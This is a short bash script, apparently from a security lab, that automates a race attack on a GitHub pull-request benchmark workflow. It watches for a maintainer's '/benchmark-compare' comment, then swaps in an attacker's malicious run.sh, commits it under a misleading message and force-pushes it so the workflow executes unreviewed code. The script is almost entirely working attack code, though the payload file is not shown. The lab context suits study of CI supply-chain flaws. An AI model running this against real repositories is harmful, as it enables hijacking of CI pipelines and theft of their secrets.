#!/usr/bin/env bash
# Attacker-side race driver (runs on the attacker's machine, against the attacker's
# OWN fork PR in the lab). Models: keep an innocuous PR open; the moment a team member
# posts '/benchmark-compare ', force-push the malicious commit so the LIVE sha the
# victim workflow resolves is the attacker's, not the reviewed one.
#
# Usage:
#   VICTIM=FazeMike1/benchmark-toctou-lab PR=1 BRANCH=attack POLL=1 ./race.sh
set -euo pipefail
: "${VICTIM:?set VICTIM=owner/repo (maintainer repo)}"
: "${PR:?set PR=<pr number on VICTIM>}"
: "${BRANCH:=attack}"
: "${POLL:=1}"

echo "[race] watching ${VICTIM} PR#${PR} for '/benchmark-compare ' ..."
last=""
while true; do
  body=$(gh api "repos/${VICTIM}/issues/${PR}/comments" --jq '.[-1] | "\(.id)\t\(.body)"' 2>/dev/null || true)
  id="${body%%$'\t'*}"; txt="${body#*$'\t'}"
  if [ -n "$id" ] && [ "$id" != "$last" ]; then
    last="$id"
    case "$txt" in
      "/benchmark-compare "*)
        echo "[race] trigger seen (comment $id). Force-pushing malicious commit NOW."
        cp attacker/malicious-run.sh benchmarks/run.sh
        git add benchmarks/run.sh
        git commit -q -m "bench tweak" || true
        git push -f origin "HEAD:${BRANCH}"
        echo "[race] pushed. Victim workflow resolves THIS sha when it queries GraphQL."
        exit 0 ;;
    esac
  fi
  sleep "$POLL"
done
